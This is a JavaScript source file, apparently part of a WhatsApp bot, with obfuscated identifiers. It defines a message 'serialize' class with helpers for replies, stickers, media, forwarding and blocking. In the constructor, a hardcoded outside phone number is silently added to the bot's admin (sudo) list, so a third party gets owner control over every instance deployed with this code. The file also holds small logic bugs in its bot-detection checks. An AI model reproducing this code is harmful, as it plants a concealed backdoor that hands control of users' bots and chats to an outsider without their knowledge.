const {
  tiny
} = require("./fancy/fancy");
const fs = require('fs');
const FileType = require("file-type");
const Config = require('../config');
const {
  getBuffer
} = require("./functions");
const util = require("util");
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
  writeExifWebp
} = require("./sticker");
let M = proto.WebMessageInfo;
class serialize {
  constructor(_0x459d62, _0x2b4567) {
    if (!_0x2b4567) {
      return _0x2b4567;
    }
    this.sock = _0x459d62;
    _0x2b4567 = M.fromObject(_0x2b4567);
    for (let _0x14ee71 in _0x2b4567) this[_0x14ee71] = _0x2b4567[_0x14ee71];
    this.botAdmins = Config.SUDO.split(',') || [Config.SUDO];
    this.botAdmins.push('917025994178', jidNormalizedUser(this.sock.user.id));
    this.displayText = this.body = this.message?.["extendedTextMessage"]?.["text"] || this.message?.["conversation"] || this.message?.[this.type]?.["text"] || this.message?.[this.type]?.['caption'] || this.message?.[this.type]?.["contentText"] || this.message?.[this.type]?.["selectedDisplayText"] || this.message?.[this.type]?.["title"] || '';
    this.admins = this.botAdmins.filter(_0x3a9eb7 => !!_0x3a9eb7);
    this.sudo = this.admins.map(_0x353bd6 => _0x353bd6.replace(/[^0-9]/g, '') + "@s.whatsapp.net");
    if (this.key) {
      this.from = this.jid = this.chat = this.bot = jidNormalizedUser(this.key.remoteJid || this.key.participant);
      this.fromMe = this.key.fromMe;
      this.id = this.key.id;
      this.isBot = this.id == undefined || null ? "false" : this.id.startsWith("BAE5") && this.id.length == 0x10;
      this.isGroup = this.from.endsWith("@g.us");
      this.sender = jidNormalizedUser(this.fromMe && this.sock.user?.['id'] || this.key.participant || this.from || '');
    }
    this.type = getContentType(this.message);
    this.message = extractMessageContent(this.message);
    if (this.message) {
      this.msg = this.message[this.type];
      this.reply_message = this.msg?.["contextInfo"] ? this.msg?.["contextInfo"]?.['quotedMessage'] : null;
      if (this.reply_message) {
        this.reply_message.media = this.msg?.["contextInfo"]?.["quotedMessage"];
        this.reply_message.image = !!this.reply_message.imageMessage;
        this.reply_message.video = !!this.reply_message.videoMessage;
        this.reply_message.location = !!this.reply_message.locationMessage;
        this.reply_message.sticker = !!this.reply_message.stickerMessage;
        this.reply_message.audio = !!this.reply_message.audioMessage;
        this.reply_message.contact = !!this.reply_message.contactMessage;
        this.reply_message.document = !!this.reply_message.documentMessage;
        this.reply_message.type = getContentType(this.reply_message);
        this.reply_message.msg = this.reply_message[this.reply_message.type];
        this.reply_message.id = this.msg?.['contextInfo']?.['stanzaId'];
        this.reply_message.sender = jidNormalizedUser(this.msg?.["contextInfo"]?.['participant']);
        this.reply_message.from = this.from;
        this.reply_message.mention = new Object();
        this.reply_message.mention.jid = this.reply_message?.['msg']?.['extendedTextMessage']?.['contextInfo']?.['mentionedJid'] || this.reply_message?.['msg']?.["contextInfo"]?.["mentionedJid"] || [];
        this.reply_message.mention.isBotNumber = this.reply_message.mention.jid.includes(this.botNumber);
        this.reply_message.mention.isOwner = this.sudo.map(_0x364679 => this.reply_message.mention.jid.includes(_0x364679)).includes(true);
        this.reply_message.isBot = this.reply_message.id ? this.reply_message?.['id']?.['startsWith']('BAE5') && this.reply_message?.['id'] == 0x10 : "false";
        this.reply_message.fromMe = this.reply_message?.["sender"] == jidNormalizedUser(this.sock.user && this.sock.user?.['id']);
        this.reply_message.text = this.reply_message?.["extendedTextMessage"]?.["text"] || this.reply_message?.["text"] || this.reply_message?.["msg"]?.["caption"] || this.reply_message?.["conversation"] || '';
        this.reply_message.caption = this.reply_message?.["msg"]?.["caption"];
        this.reply_message.mime = this.reply_message?.['msg']?.['mimetype'];
        this.reply_message.number = this.reply_message.sender ? this.reply_message.sender.replace(/[^0-9]/g, '') : undefined;
        this.reply_message.download = _0x11bf18 => this.downloadMediaMessage(this.reply_message?.["msg"]);
      } else {
        this.reply_message = new Object();
        this.reply_message.mention = new Object();
      }
    }
    this.client = _0x459d62;
    this.data = this;
    this.number = this.sender.replace(/[^0-9]/g, '');
    this.budy = typeof this.text == "string" ? this.text : '';
    this.pushName = this.pushName || "No Name";
    this.botNumber = jidNormalizedUser(this.sock.user.id);
    this.caption = this.message?.[this.type]?.["caption"];
    this.mention = new Object();
    this.mention.jid = this.msg?.["contextInfo"]?.["mentionedJid"] || [];
    this.mention.isBotNumber = this.mention.jid.includes(this.botNumber);
    this.mention.isOwner = this.sudo.map(_0x502acf => this.mention.jid.includes(_0x502acf)).includes(true);
    this.q = this.reply_message?.["from"] ? this.reply_message : this;
    this.mime = (this.q?.["msg"] || this.q).mimetype || "text";
    this.isMedia = /image|video|sticker|audio/.test(this.mime);
    this.from = this.key.remoteJid;
    this.image = !!this.msg?.['imageMessage'];
    this.video = !!this.msg?.["videoMessage"];
    this.location = !!this.msg?.['locationMessage'];
    this.sticker = !!this.msg?.["stickerMessage"];
    this.audio = !!this.msg?.["audioMessage"];
    this.contact = !!this.msg?.['contactMessage'];
    this.document = !!this.msg?.['documentMessage'];
    this.user = new Object();
    this.user.id = this.sock.user.id;
    this.dm = this.sock.user.id;
    this.user.jid = jidNormalizedUser(this.sock.user.id);
    this.user.number = this.user.jid.replace(/[^0-9]/g, '');
  }
  async ["download"]() {
    await this.downloadMediaMessage(this.msg);
  }
  async ["editMessage"](_0xdea842, _0x38044f, _0x1490e8) {
    return await this.sock.relayMessage(_0xdea842, {
      'protocolMessage': {
        'key': _0x1490e8,
        'type': 0xe,
        'editedMessage': {
          'conversation': _0x38044f
        }
      }
    }, {});
  }
  async ["sendMessage"](_0x16413f) {
    return this.sock.sendMessage(this.jid, {
      ..._0x16413f
    }, {
      'quoted': _0x16413f.quoted
    });
  }
  async ["reply"](_0x5ab4f9) {
    return await this.sock.sendMessage(this.jid, {
      'text': util.format(_0x5ab4f9)
    }, {
      'quoted': this
    });
  }
  async ["tinyReply"](_0x803614, _0x361a32) {
    return await this.sock.sendMessage(this.jid, {
      'text': tiny(util.format(_0x803614))
    }, _0x361a32);
  }
  ["isMediaURL"](_0x1ff8aa) {
    const _0xa2a072 = ['jpg', "jpeg", "png", "gif", "mp4", 'webm', "webp"];
    if (!_0x1ff8aa.includes('.')) {
      return false;
    }
    const _0x52ae86 = _0x1ff8aa.split('.').pop().toLowerCase();
    return _0xa2a072.includes(_0x52ae86) && _0x1ff8aa.startsWith("http");
  }
  async ["sendSticker"](_0x1bdf68, _0x1d0f83, _0x5478f9 = {}) {
    const _0x48ff3c = Buffer.isBuffer(_0x1d0f83);
    if (!_0x48ff3c) {
      _0x1d0f83 = await getBuffer(_0x1d0f83);
    }
    const {
      mime: _0x39eac3
    } = await FileType.fromBuffer(_0x1d0f83);
    if (_0x39eac3.includes("webp")) {
      return await this.sock.sendMessage(_0x1bdf68, {
        'sticker': {
          'url': await writeExifWebp(_0x1d0f83, {
            'packname': _0x5478f9.packname,
            'author': _0x5478f9.author ? _0x5478f9.author : _0x5478f9.packname ? undefined : " "
          })
        },
        ..._0x5478f9
      }, {
        'quoted': _0x5478f9.quoted
      });
    } else if (_0x39eac3.includes("image")) {
      if (_0x5478f9.packname || _0x5478f9.author) {
        return await this.sock.sendMessage(_0x1bdf68, {
          'sticker': {
            'url': await writeExifImg(_0x1d0f83, {
              'packname': _0x5478f9.packname,
              'author': _0x5478f9.author
            })
          },
          ..._0x5478f9
        }, {
          'quoted': _0x5478f9.quoted
        });
      } else {
        return await this.sock.sendMessage(_0x1bdf68, {
          'sticker': await imageToWebp(_0x1d0f83),
          ..._0x5478f9
        }, {
          'quoted': _0x5478f9.quoted
        });
      }
    } else if (_0x39eac3.includes('video')) {
      if (_0x5478f9.packname || _0x5478f9.author) {
        return await this.sock.sendMessage(_0x1bdf68, {
          'sticker': {
            'url': await writeExifVid(_0x1d0f83, {
              'packname': _0x5478f9.packname,
              'author': _0x5478f9.author
            })
          },
          ..._0x5478f9
        }, {
          'quoted': _0x5478f9.quoted
        });
      } else {
        return await this.sock.sendMessage(_0x1bdf68, {
          'sticker': await videoToWebp(_0x1d0f83),
          ..._0x5478f9
        }, {
          'quoted': _0x5478f9.quoted
        });
      }
    }
  }
  async ["send"](_0x3fa434, _0x59b565 = {}, _0x115d88 = 'text') {
    const _0x5ce1f8 = Buffer.isBuffer(_0x3fa434);
    const _0x5ae287 = _0x5ce1f8 ? false : typeof _0x3fa434 != "object" ? this.isMediaURL(_0x3fa434) : false;
    if (_0x115d88 != "text" && _0x5ae287) {
      _0x3fa434 = await getBuffer(_0x3fa434);
    }
    if (_0x59b565.linkPreview) {
      _0x59b565.contextInfo = {
        'externalAdReply': _0x59b565.linkPreview
      };
      delete _0x59b565.linkPreview;
    }
    if (_0x115d88 == "text") {
      if (_0x59b565?.["contextInfo"]?.["externalAdReply"]) {
        _0x59b565.contextInfo.externalAdReply.previewType = 'PHOTO';
        _0x59b565.contextInfo.externalAdReply.containsAutoReply = true;
      }
      let _0x1fdfbd = await this.sock.sendMessage(this.jid, {
        'text': util.format(_0x3fa434),
        ..._0x59b565
      }, {
        'quoted': _0x59b565.quoted
      });
      _0x1fdfbd.edit = async _0x260a48 => {
        return await this.sock.relayMessage(this.jid, {
          'protocolMessage': {
            'key': _0x1fdfbd.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x260a48
            }
          }
        }, {});
      };
      _0x1fdfbd["delete"] = async () => {
        return await this.sock.sendMessage(this.jid, {
          'delete': _0x1fdfbd.key
        });
      };
      _0x1fdfbd.react = async _0x192ef0 => {
        return await this.sock.sendMessage(this.jid, {
          'react': {
            'text': _0x192ef0,
            'key': _0x1fdfbd.key
          }
        });
      };
      return _0x1fdfbd;
    } else if (_0x115d88 == "image") {
      return await this.sock.sendMessage(this.jid, {
        'image': _0x3fa434,
        ..._0x59b565
      }, {
        'quoted': _0x59b565.quoted
      });
    } else if (_0x115d88 == "video") {
      return await this.sock.sendMessage(this.jid, {
        'video': _0x3fa434,
        ..._0x59b565
      }, {
        'quoted': _0x59b565.quoted
      });
    } else if (_0x115d88 == "sticker") {
      return await this.sendSticker(this.jid, _0x3fa434, {
        'packname': _0x59b565.packname,
        'author': _0x59b565.author,
        ..._0x59b565
      });
    } else if (_0x115d88 == "audio") {
      return await this.sock.sendMessage(this.jid, {
        'audio': _0x3fa434,
        ..._0x59b565
      }, {
        'quoted': _0x59b565.quoted
      });
    }
    ;
  }
  async ["forward"](_0xba6e58, _0x939a31, _0x493d2e = {}) {
    let _0x100adf = generateWAMessageFromContent(_0xba6e58, _0x939a31, {
      ..._0x493d2e,
      'userJid': this.user.id
    });
    await this.client.relayMessage(_0xba6e58, _0x100adf.message, {
      'messageId': _0x100adf.key.id,
      ..._0x493d2e
    });
    return _0x100adf;
  }
  async ["PresenceUpdate"](_0x27ca54) {
    await sock.sendPresenceUpdate(_0x27ca54, this.jid);
  }
  async ["delete"](_0x84a719) {
    await this.sock.sendMessage(this.jid, {
      'delete': _0x84a719
    });
  }
  async ["updateName"](_0x14297a) {
    await this.sock.updateProfileName(_0x14297a);
  }
  async ["getPP"](_0x172d5c) {
    return await this.sock.profilePictureUrl(_0x172d5c, "image");
  }
  async ['setPP'](_0x4dafa9, _0x59b99d) {
    if (Buffer.isBuffer(_0x59b99d)) {
      await this.sock.updateProfilePicture(_0x4dafa9, _0x59b99d);
    } else {
      await this.sock.updateProfilePicture(_0x4dafa9, {
        'url': _0x59b99d
      });
    }
  }
  async ["block"](_0x285688) {
    await this.sock.updateBlockStatus(_0x285688, "block");
  }
  async ['unblock'](_0x2a5439) {
    await this.sock.updateBlockStatus(_0x2a5439, 'unblock');
  }
  ["decodeJid"](_0x3bf415) {
    if (!_0x3bf415) {
      return _0x3bf415;
    }
    if (/:\d+@/gi.test(_0x3bf415)) {
      let _0x4c42a6 = jidDecode(_0x3bf415) || {};
      return _0x4c42a6.user && _0x4c42a6.server && _0x4c42a6.user + '@' + _0x4c42a6.server || _0x3bf415;
    } else {
      return _0x3bf415;
    }
  }
  ['parseMention'](_0x3aeb50) {
    return [..._0x3aeb50.matchAll(/@([0-9]{5,16}|0)/g)].map(_0xed04f0 => _0xed04f0[0x1] + "@s.whatsapp.net");
  }
  async ["downloadMediaMessage"](_0x195d22) {
    _0x195d22 = _0x195d22?.['msg'] ? _0x195d22?.["msg"] : _0x195d22;
    let _0x2d7075 = (_0x195d22.msg || _0x195d22).mimetype || '';
    let _0x421634 = _0x195d22.type ? _0x195d22.type.replace(/Message/gi, '') : _0x2d7075.split('/')[0x0];
    const _0x9078de = await downloadContentFromMessage(_0x195d22, _0x421634);
    let _0x398cf5 = Buffer.from([]);
    for await (const _0x35fb41 of _0x9078de) {
      _0x398cf5 = Buffer.concat([_0x398cf5, _0x35fb41]);
    }
    return _0x398cf5;
  }
  async ["downloadAndSaveMediaMessage"](_0x5762c7, _0x461296, _0x2f6423 = true) {
    let _0x42640f = _0x5762c7.msg ? _0x5762c7.msg : _0x5762c7;
    let _0x383ac4 = (_0x5762c7.msg || _0x5762c7).mimetype || '';
    let _0x12b8d3 = _0x5762c7.mtype ? _0x5762c7.mtype.replace(/Message/gi, '') : _0x383ac4.split('/')[0x0];
    const _0x28df75 = await downloadContentFromMessage(_0x42640f, _0x12b8d3);
    let _0x5dab93 = Buffer.from([]);
    for await (const _0x28c716 of _0x28df75) {
      _0x5dab93 = Buffer.concat([_0x5dab93, _0x28c716]);
    }
    let _0x257e6c = await FileType.fromBuffer(_0x5dab93);
    let _0x5cdc41 = _0x2f6423 ? _0x461296 + '.' + _0x257e6c.ext : _0x461296;
    await fs.writeFileSync(_0x5cdc41, _0x5dab93);
    return _0x5cdc41;
  }
}
module.exports = {
  'serialize': serialize
};
